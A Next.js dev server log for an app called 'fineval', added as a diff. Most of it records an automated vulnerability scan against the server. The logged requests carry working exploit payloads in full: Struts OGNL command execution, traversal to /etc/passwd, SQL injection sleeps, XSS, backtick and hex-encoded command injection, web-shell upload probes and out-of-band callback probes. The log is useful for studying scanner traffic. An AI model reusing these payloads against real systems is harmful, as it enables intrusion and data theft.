@@ -1,0 +1,1149 @@
+
+> fineval@0.1.0 dev
+> next dev -p 10005 --turbopack
+
+   ▲ Next.js 15.3.4 (Turbopack)
+   - Local:        http://localhost:10005
+   - Network:      http://172.18.0.2:10005
+   - Environments: .env.local
+
+ ✓ Starting...
+Slow filesystem detected. If /new1/whh01/llmtest/.next is a network drive, consider moving it to a local folder. If you have an antivirus enabled, consider excluding your project directory.
+ ✓ Ready in 2s
+ ○ Compiling / ...
+ ✓ Compiled / in 4.3s
+ GET / 200 in 4706ms
+ ⚠ Cross origin request detected from fineval.top to /_next/* resource. In a future major version of Next.js, you will need to explicitly configure "allowedDevOrigins" in next.config to allow this.
+Read more: https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 813ms
+ GET /favicon.ico?favicon.45db1c09.ico 200 in 1091ms
+ ○ Compiling /evaluate ...
+ ✓ Compiled /evaluate in 1794ms
+ GET /evaluate 200 in 2312ms
+ GET / 200 in 105ms
+ GET / 200 in 88ms
+ GET /favicon.ico?favicon.45db1c09.ico 200 in 228ms
+ GET / 200 in 104ms
+ ⚠ Cross origin request detected from 166.111.111.128 to /_next/* resource. In a future major version of Next.js, you will need to explicitly configure "allowedDevOrigins" in next.config to allow this.
+Read more: https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins
+ GET /favicon.ico?favicon.45db1c09.ico 200 in 228ms
+ GET /evaluate 200 in 3847ms
+ GET /evaluate 200 in 479ms
+ GET /evaluate 200 in 705ms
+ GET / 200 in 91ms
+ GET /favicon.ico?favicon.45db1c09.ico 200 in 229ms
+ GET / 200 in 172ms
+ GET /favicon.ico 200 in 228ms
+ GET / 200 in 412ms
+ GET /favicon.ico?favicon.45db1c09.ico 200 in 433ms
+ ○ Compiling /_not-found/page ...
+ ✓ Compiled /_not-found/page in 2.3s
+ GET /robots.txt 404 in 7969ms
+ GET /sitemap.xml 404 in 196ms
+ GET /config.json 404 in 308ms
+ GET / 200 in 92ms
+ POST /wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php 404 in 231ms
+ POST /?q=node&destination=node 200 in 84ms
+ POST /mobile/plugin/browser.jsp 404 in 329ms
+ GET /wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E 404 in 871ms
+ GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd 404 in 755ms
+ POST /axis2-admin/login 404 in 75ms
+ GET /index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D 404 in 204ms
+ GET /index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D 404 in 207ms
+ GET /index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D 404 in 76ms
+ GET /costModule/faces/javax.faces.resource/web.xml?loc=../WEB-INF 404 in 234ms
+ GET /myaccount/javax.faces.resource/web.xml?loc=../WEB-INF 404 in 233ms
+ GET /cgi-bin/status 404 in 82ms
+ GET /test.cgi 404 in 227ms
+ GET /cgi-bin/test-cgi 404 in 236ms
+ GET /cgi-bin/test.cgi 404 in 77ms
+ POST /sys/ui/extend/varkind/custom.jsp 404 in 61ms
+ GET /wp-content/plugins/advanced-text-widget/readme.txt 404 in 44ms
+ POST /_search 404 in 72ms
+ GET /wp-admin/admin.php?where1=<script>alert(document.domain)</script>&searchsubmit=Buscar&page=nsp_search 404 in 70ms
+ GET / 200 in 164ms
+ GET / 200 in 90ms
+ GET /wp-content/plugins/trafficanalyzer/readme.txt 404 in 89ms
+ GET / 200 in 248ms
+ POST /wp-admin/admin-ajax.php 404 in 797ms
+ GET / 200 in 88ms
+ GET /wp-content/plugins/sourceafrica/readme.txt 404 in 70ms
+ GET /wp-content/plugins/wpsolr-search-engine/readme.txt 404 in 66ms
+ GET / 200 in 112ms
+ GET /wp-content/plugins/amty-thumb-recent-post/readme.txt 404 in 73ms
+ GET /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 70ms
+ GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 64ms
+ GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 92ms
+ POST /webtools/control/xmlrpc 404 in 77ms
+ POST /timesheet/login.php 404 in 66ms
+ POST /CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData 404 in 73ms
+ GET / 200 in 106ms
+ POST /share/page/dologin 404 in 86ms
+ GET /jnoj/web/polygon/problem/viewfile?id=1&name=../../../../../../../etc/passwd 404 in 70ms
+ POST /admin/auth/reset-password 404 in 62ms
+ POST /com.example.TestService 404 in 237ms
+ POST /wp-admin/options-general.php?page=yuzo-related-post 404 in 71ms
+ GET / 200 in 85ms
+ GET /wp-content/plugins/raygun4wp/readme.txt 404 in 64ms
+ GET /cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences 404 in 72ms
+ POST /Collector/appliancesettings/applianceSettingsFileTransfer 404 in 67ms
+ GET /talari/app/files/304hNB8BFWhvplBSkTfX2Wlmzku 404 in 78ms
+ POST /wls-wsat/CoordinatorPortType 404 in 77ms
+ GET /objects/getImage.php?base64Url=YGlkID4gd3ZqaHgudHh0YA===&format=png 404 in 67ms
+ GET /objects/getImageMP4.php?base64Url=YGlkID4gd3ZqaHgudHh0YA===&format=jpg 404 in 83ms
+ GET /objects/getSpiritsFromVideo.php?base64Url=YGlkID4gd3ZqaHgudHh0YA===&format=jpg 404 in 58ms
+ GET /objects/wvjhx.txt 404 in 60ms
+ POST /rest/issueNav/1/issueTable 404 in 59ms
+ POST / 200 in 88ms
+ POST /artifactory/ui/auth/login?_spring_security_remember_me=false 404 in 49ms
+ POST /cgi-bin/supportInstaller 404 in 56ms
+ POST /Autodiscover/Autodiscover.xml 404 in 57ms
+ POST /adxmlrpc.php 404 in 84ms
+ GET /objects/getSpiritsFromVideo.php?base64Url=YGlkID4gQW1Qdy50eHRg&format=jpg 404 in 62ms
+ GET /objects/AmPw.txt 404 in 88ms
+ POST /mailingupgrade.php 404 in 59ms
+ GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20gINeNMoOGw.txt%60 404 in 88ms
+ POST /kindeditor/php/demo.php 404 in 58ms
+ POST /content/304hNGoVrfhAX9f0NZqY9f9w8Qx.af.internalsubmit.json 404 in 72ms
+ GET /gINeNMoOGw.txt 404 in 57ms
+ POST /v2/api/product/manger/getInfo 404 in 67ms
+ GET /api/experimental/test 404 in 578ms
+ GET /api/experimental/dags/example_trigger_target_dag/paused/false 404 in 110ms
+ POST /roundcube/installer/index.php 404 in 75ms
+ GET /wp-content/plugins/my-calendar/readme.txt 404 in 70ms
+ GET / 200 in 76ms
+ GET /zabbix/zabbix.php 404 in 70ms
+ GET / 200 in 109ms
+ POST /ajax/api/content_infraction/getIndexableContent 404 in 73ms
+ POST /console/images/%252e%252e%252fconsole.portal 404 in 79ms
+ GET /user/login 404 in 94ms
+ GET /cgi-bin/cgiServer.exx?page=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 404 in 71ms
+ GET /webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f20224d7a4130614535545a4852435430566a645739686556646b55326450646c467a576d563422207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5 404 in 79ms
+ GET /webadmin/out 404 in 60ms
+ GET /fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27; 404 in 62ms
+ GET /cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C 404 in 60ms
+ POST /apisix/admin/routes 404 in 33ms
+ POST /login 404 in 73ms
+ POST /index.php?option=comgmapfp&controller=editlieux&tmpl=component&task=upload_image 404 in 138ms
+ GET /?p=1 200 in 49ms
+ GET /cgi-bin/cgiServer.exx?download=/etc/passwd 404 in 37ms
+ GET / 200 in 78ms
+ GET /wp-login.php 404 in 35ms
+ GET /labkey/home/project-begin.view 404 in 47ms
+ POST /service/v1/createUser 404 in 42ms
+ GET /setup.cgi?todo=debug&x=currentsetting.htm 404 in 36ms
+ GET /v1/kv/304hNQumfITgwO8K86Xkpl0qV5P?raw 404 in 35ms
+ GET /assets/data/usrimg/304hnhgsinr6l0xmluods1lhhyn.php 404 in 35ms
+ GET /file/LtsEBy.txt 404 in 42ms
+ POST /auth/check 404 in 36ms
+ POST /auth/newpassword 404 in 36ms
+ GET /index.php?module=users/login 404 in 37ms
+ POST /auth/requestreset 404 in 53ms
+ GET /index.php?module=users/login 404 in 37ms
+ GET /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php 404 in 52ms
+ POST /cgi-bin/libagent.cgi?type=J 404 in 38ms
+ POST /EemAdminService/EemAdmin 404 in 41ms
+ POST /CTCWebService/CTCWebServiceBean/ConfigServlet 404 in 39ms
+ GET /PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E 404 in 37ms
+ POST /menu/stapp 404 in 65ms
+ POST /api/jsonws/invoke 404 in 40ms
+ POST /magmi/web/magmi_saveprofile.php 404 in 39ms
+ POST /opensis/index.php 404 in 36ms
+ POST /index.php 404 in 33ms
+ GET /wp-content/plugins/import-xml-feed/readme.txt 404 in 36ms
+ POST /cgi-bin/mainfunction.cgi 404 in 36ms
+ GET /menu/neo 404 in 35ms
+ GET /menu/stc 404 in 89ms
+ GET /index.php?app=main&inc=core_auth&route=login 404 in 39ms
+ POST / 200 in 128ms
+ GET /wp-admin/index.php 404 in 40ms
+ POST /getcfg.php 404 in 37ms
+ GET /?author=1 200 in 52ms
+ POST / 200 in 81ms
+ POST /webtools/control/xmlrpc 404 in 50ms
+ POST /graphql 404 in 36ms
+ GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release 404 in 42ms
+ GET /hsqldb%0a 404 in 36ms
+ POST /tmui/locallb/workspace/tmshCmd.jsp 404 in 36ms
+ POST /tmui/locallb/workspace/tmshCmd.jsp 404 in 42ms
+ GET /images/..%2finfo.html 404 in 42ms
+ GET /login.php 404 in 94ms
+ POST /cgi-bin/mt/mt-xmlrpc.cgi 404 in 37ms
+ GET /goform/goform_get_cmd_process?cmd=psw_fail_num_str 404 in 64ms
+ GET /wp-content/plugins/event-espresso-core-reg/readme.txt 404 in 46ms
+ POST /apply_sec.cgi 404 in 32ms
+ ⨯ [TypeError: Failed to parse body as FormData.]
+ ○ Compiling /_error ...
+ POST /index.php 404 in 225ms
+ POST /adminer/adminer.php 404 in 237ms
+ ✓ Compiled /_error in 2.6s
+ POST /logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D 500 in 8503ms
+ POST /_adminer.php 404 in 39ms
+ POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData 404 in 31ms
+ POST /_bulk 404 in 79ms
+ POST /api/v1/method.callAnon/getPasswordPolicy 404 in 55ms
+ POST /mgmt/shared/authn/login 404 in 56ms
+ GET /wp-content/plugins/canto/readme.txt 404 in 59ms
+ GET / 200 in 81ms
+ POST /analytics/telemetry/ph/api/hyper/send?_c&_i=test 404 in 45ms
+ POST /lucee/304hN3UF0gq1RGDbj2jXXFHumnW.cfm 404 in 57ms
+ GET / 200 in 58ms
+ GET /server-common/cgi-bin/login 404 in 56ms
+ GET /wp-admin/admin-ajax.php?action=likebtn_prx&likebtn_q=aHR0cDovL2xpa2VidG4uY29tLm9hc3QubWU=" 404 in 67ms
+ POST /auth/realms/master/clients-registrations/default 404 in 38ms
+ POST /auth/realms/master/clients-registrations/openid-connect 404 in 68ms
+ ⨯ [TypeError: Failed to parse body as FormData.]
+ POST /wp-comments-post.php 500 in 423ms
+ GET /wp-content/plugins/imagements/images/304hnfcyz9eqpkskwsaqwl7w3bi.php 404 in 142ms
+ POST /wp-admin/admin-ajax.php 404 in 53ms
+ GET /wp-content/uploads/kaswara/fonts_icon/slfgyz/tk.php 404 in 43ms
+ GET /wp-content/plugins/wp-statistics/readme.txt 404 in 42ms
+ GET /wp-admin/admin.php?page=wps_pages_page&ID=0+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))test)&type=home 404 in 89ms
+ GET /?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng 200 in 54ms
+ POST /wp-admin/admin-ajax.php?action=pollinsertvalues 404 in 39ms
+ GET /?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(1)%3E%3C%22 200 in 93ms
+ POST /wp-json/pie/v1/login 404 in 34ms
+ ⨯ [TypeError: Failed to parse body as FormData.]
+ POST /wp-admin/admin-ajax.php 500 in 301ms
+ GET /wp-content/uploads/workreap-temp/304hNB14I1tQk2TnlWf12xP9AlM.php 404 in 83ms
+ POST /wp-admin/admin.php?page=contest-gallery/index.php&users_management=true&option_id=1 404 in 74ms
+ GET /wp-admin/options.php 404 in 79ms
+ GET /wp-admin/profile.php 404 in 84ms
+ POST /wp-admin/admin-ajax.php?action=_ning_upload_image 404 in 362ms
+ GET / 200 in 85ms
+ GET /wp-content/plugins/ultimate-faqs/readme.txt 404 in 71ms
+ GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json 404 in 67ms
+ GET /wp-admin/admin-ajax.php?action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g 404 in 70ms
+ GET /wp-admin/admin.php?page=chaty-contact-form-feed&search=%3C%2Fscript%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E 404 in 60ms
+ GET /wp-content/plugins/wpcargo/includes/304hNKii5fAD7mnl0GCo3WvpyRx.php 404 in 80ms
+ GET /wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath=304hNKii5fAD7mnl0GCo3WvpyRx.php 404 in 75ms
+ POST /wp-content/plugins/wpcargo/includes/304hNKii5fAD7mnl0GCo3WvpyRx.php?1=var_dump 404 in 57ms
+ GET /swarm.cgi?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27 404 in 76ms
+ GET /nagiosxi/login.php 404 in 58ms
+ POST /run 404 in 57ms
+ GET /?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g 200 in 82ms
+ GET /wp-content/plugins/paid-memberships-pro/js/pmpro-checkout.js 404 in 68ms
+ GET /nagiosxi/login.php 404 in 47ms
+ GET /nagiosxi/login.php 404 in 60ms
+ POST /druid/indexer/v1/sampler 404 in 64ms
+ POST /confluence/pages/createpage-entervariables.action 404 in 72ms
+ POST /wiki/pages/createpage-entervariables.action?SpaceKey=x 404 in 118ms
+ POST /pages/doenterpagevariables.action 404 in 143ms
+ POST /webtools/control/SOAPService 404 in 62ms
+ POST /patient/search_result.php 404 in 80ms
+ GET /wp-content/plugins/daggerhart-openid-connect-generic/readme.txt 404 in 83ms
+ GET /wp-content/plugins/pie-register/readme.txt 404 in 70ms
+ GET /wp-content/plugins/stop-spammer-registrations-plugin/readme.txt 404 in 76ms
+ GET / 200 in 117ms
+ POST /contactus.php 404 in 70ms
+ GET /wp-content/plugins/giveasap/readme.txt 404 in 74ms
+ POST /contactus.php 404 in 69ms
+ POST /contactus.php 404 in 64ms
+ GET /wp-content/themes/jnews/readme.txt 404 in 43ms
+ POST /api/snapshots 404 in 68ms
+ GET / 200 in 98ms
+ POST /tools.cgi 404 in 70ms
+ POST /tools.cgi 404 in 59ms
+ GET /backup2.cgi 404 in 75ms
+ GET /log_download.cgi?type=../../etc/passwd 404 in 46ms
+ GET /log_download.cgi?type=../../etc/passwd 404 in 72ms
+ POST /webtools/control/SOAPService 404 in 68ms
+ GET / 200 in 82ms
+ GET / 200 in 91ms
+ POST /seo/seopanel/login.php?sec=forgot 404 in 70ms
+ POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld 404 in 79ms
+ POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld 404 in 77ms
+ POST /webtools/control/SOAPService 404 in 55ms
+ GET /module/productcomments/CommentGrade?id_products[]=1*if(now()=sysdate()%2Csleep(8)%2C0) 404 in 68ms
+ ⨯ [TypeError: Failed to parse body as FormData.] { page: '/' }
+ POST / 500 in 334ms
+ GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name=304hNGoyW7nsvfroVqP2Z6LOtjw.php&target=l1_Lw 404 in 79ms
+ GET /t/index.php?action[]=aaaa 404 in 71ms
+ GET /status.htm 404 in 100ms
+ POST /RPC2_Login 404 in 69ms
+ POST /RPC2_Login 404 in 63ms
+ POST /_ignition/execute-solution 404 in 68ms
+ POST /_ignition/execute-solution 404 in 72ms
+ POST /_ignition/execute-solution 404 in 75ms
+ POST /_ignition/execute-solution 404 in 76ms
+ POST /_ignition/execute-solution 404 in 70ms
+ POST /_ignition/execute-solution 404 in 109ms
+[TypeError: Invalid URL] {
+  code: 'ERR_INVALID_URL',
+  input: '/\\u001B]8;;https://interact.sh"/onmouseover="alert(1)\\u0007example\\u001B]8;;\\u0007',
+  base: 'http://n'
+}
+ POST /wp-admin/admin-ajax.php 404 in 60ms
+ ⨯ [TypeError: Failed to parse body as FormData.]
+ POST /Config/SaveUploadedHotspotLogoFile 500 in 561ms
+ GET /Assets/temp/hotspot/img/logohotspot.txt 404 in 193ms
+ ⨯ Error: Failed to decode path param(s).
+    at Array.map (<anonymous>)
+ GET /%u002e/WEB-INF/web.xml 500 in 136ms
+ GET /.%00/WEB-INF/web.xml 404 in 58ms
+ POST /?Command=NOOP&InternalFile=../../../../../../../../../../../../../../Windows/win.ini&NewWebClient=1 200 in 88ms
+ GET /bludit/admin/login 404 in 83ms
+ POST /wp-admin/admin-ajax.php 404 in 65ms
+ POST /wp-login.php 404 in 98ms
+ PUT /SDK/webLanguage 404 in 74ms
+ GET /x 404 in 138ms
+ GET /wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3C%2Fh1%3E26 404 in 60ms
+ POST /ajaxPages/writeBrowseFilePathAjax.php 404 in 58ms
+ GET /dashboardUser 404 in 70ms
+ POST /druid/indexer/v1/sampler?for=connect 404 in 67ms
+ GET /module/ph_simpleblog/list?sb_category=')%20OR%20true--%20- 404 in 55ms
+ GET /module/ph_simpleblog/list?sb_category=')%20AND%20false--%20- 404 in 71ms
+ GET /nagiosxi/login.php 404 in 60ms
+ POST /home/download 404 in 57ms
+ POST /controller/origemdb.php?idselorigem=ATIVOS 404 in 56ms
+ POST /controller/login.php?acao=autenticar 404 in 81ms
+ POST /controller/login.php?acao=autenticar 404 in 63ms
+ GET /wp-admin/admin-ajax.php?action=47a0e932410b17dad341cada2819d670 404 in 79ms
+ GET /wp-admin/admin-ajax.php?action=106691fa166d8dd4b96141b6116d043f 404 in 114ms
+ POST /wsman 404 in 59ms
+ GET /misc.php?action=showpopups&type=friend 404 in 68ms
+ GET /api/v1/components?name=1&1%5B0%5D&1%5B1%5D=a&1%5B2%5D&1%5B3%5D=or+'a'='a')%20and%20(select%20sleep(6))-- 404 in 58ms
+ POST /wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php 404 in 66ms
+ OPTIONS /wp-json/omapp/v1/support 404 in 70ms
+ GET /api/help'onmouseover=alert(document.domain)/'/;/beta/license 404 in 58ms
+ POST /Config/SaveUploadedHotspotLogoFile 404 in 57ms
+ POST /cobbler_api 404 in 75ms
+ POST /getcfg.php 404 in 57ms
+[Error: Requested and resolved page mismatch: /about/../tree /tree]
+[Error: Requested and resolved page mismatch: /about/../tree /tree]
+[Error: Requested and resolved page mismatch: /about/../tree /tree]
+[Error: Requested and resolved page mismatch: /about/../tree /tree]
+ GET /about/../tree?action=get 404 in 140ms
+ POST /install.php?page=4 404 in 73ms
+ POST /install.php?page=4 404 in 65ms
+ POST /install.php?page=1 404 in 67ms
+[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
+[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
+[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
+[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
+ POST /./RestAPI/LogonCustomization 404 in 152ms
+[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
+[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
+[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
+[Error: Requested and resolved page mismatch: /./RestAPI/LogonCustomization /RestAPI/LogonCustomization]
+ POST /./RestAPI/LogonCustomization 404 in 169ms
+[Error: Requested and resolved page mismatch: /./RestAPI/Connection /RestAPI/Connection]
+[Error: Requested and resolved page mismatch: /./RestAPI/Connection /RestAPI/Connection]
+[Error: Requested and resolved page mismatch: /./RestAPI/Connection /RestAPI/Connection]
+[Error: Requested and resolved page mismatch: /./RestAPI/Connection /RestAPI/Connection]
+ POST /./RestAPI/Connection 404 in 199ms
+ GET /help/admin-guide/test.jsp 404 in 123ms
+ POST /v1/backend1 404 in 77ms
+ GET /v1/304hNFcq5GJSV3QnEaxZ6OkGQpv.php 404 in 83ms
+ POST /install.php?page=4 404 in 68ms
+ POST /install.php?page=4 404 in 73ms
+ POST /install.php?page=4 404 in 73ms
+ GET /index.php 404 in 64ms
+ GET / 200 in 80ms
+ GET /fmangersub?cpath=../../../../../../../etc/passwd 404 in 62ms
+ GET / 200 in 87ms
+ POST /autodiscover/autodiscover.json 404 in 60ms
+ POST /delete_cart_goods.php 404 in 76ms
+ POST /action.php 404 in 71ms
+ POST /homeaction.php 404 in 58ms
+ POST /TransferredOutModal.php?modfunc=detail 404 in 53ms
+ POST /index.php 404 in 75ms
+ GET / 200 in 73ms
+ GET / 200 in 61ms
+ GET /cgi-bin/slogin/login.py 404 in 57ms
+ GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 400 in 20ms
+ GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd 404 in 58ms
+ POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh 405 in 31ms
+ ⨯ Error: Failed to decode path param(s).
+    at Array.map (<anonymous>)
+ GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd 500 in 114ms
+ ⨯ Error: Failed to decode path param(s).
+    at Array.map (<anonymous>)
+ GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd 500 in 75ms
+ GET / 200 in 95ms
+ GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=304hN9p0uLYBeKOqc8gy0MxStLf.php:aaa 404 in 82ms
+ POST /wp-admin/admin-ajax.php 404 in 80ms
+[Error: Requested and resolved page mismatch: /file/../../../../../../../../../../../../../../../../../../windows/win.ini /windows/win.ini]
+[Error: Requested and resolved page mismatch: /file/../../../../../../../../../../../../../../../../../../windows/win.ini /windows/win.ini]
+[Error: Requested and resolved page mismatch: /file/../../../../../../../../../../../../../../../../../../windows/win.ini /windows/win.ini]
+[Error: Requested and resolved page mismatch: /file/../../../../../../../../../../../../../../../../../../windows/win.ini /windows/win.ini]
+ GET /file/../../../../../../../../../../../../../../../../../../etc/passwd 400 in 22ms
+ GET /file/../../../../../../../../../../../../../../../../../../windows/win.ini 404 in 176ms
+ POST /classes/Login.php?f=login 404 in 70ms
+ GET / 200 in 167ms
+ GET / 200 in 92ms
+ POST /Side.php 404 in 61ms
+ GET /STATE_ID/123/agentLogUploader 404 in 43ms
+ GET / 200 in 78ms
+ GET /client/index.php 404 in 59ms
+ GET /changePassword?username=administrator 404 in 64ms
+ GET /language/lang 404 in 73ms
+ GET /api/blade-user/user-list 404 in 74ms
+ GET /api/blade-user/user-list 404 in 201ms
+ GET /api/blade-user/user-list 404 in 200ms
+ GET /304hNEdJzXKXnle9hRAAdylneKX.txt 404 in 70ms
+ PUT /304hNEdJzXKXnle9hRAAdylneKX.txt 404 in 101ms
+ POST /apply.cgi 404 in 62ms
+ GET / 200 in 93ms
+ GET /archive/download?file=file:///etc/passwd 404 in 71ms
+ GET /geoserver 404 in 75ms
+ PUT /cgi-bin/aTtwQJ.txt 404 in 65ms
+ DELETE /cgi-bin/aTtwQJ.txt 404 in 73ms
+ PUT /cgi-bin/RHuF6Y.txt 404 in 54ms
+ GET /cgi-bin/RHuF6Y.txt 404 in 67ms
+ POST /wp-admin/admin.php?page=vfb-export 404 in 58ms
+ GET /wp-admin 404 in 70ms
+ GET /images/icons_title.gif 404 in 57ms
+ DELETE /images/icons_title.gif 404 in 46ms
+ GET /images/icons_title.gif 404 in 149ms
+ GET /wp-admin/admin-ajax.php?action=woocs_get_products_price_html&woocs_in_order_currency=<img%20src%20onerror=alert(document.domain)> 404 in 55ms
+ GET /wp-admin/admin.php?page=nsp_search&what1=%27+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x 404 in 57ms
+ POST / 200 in 74ms
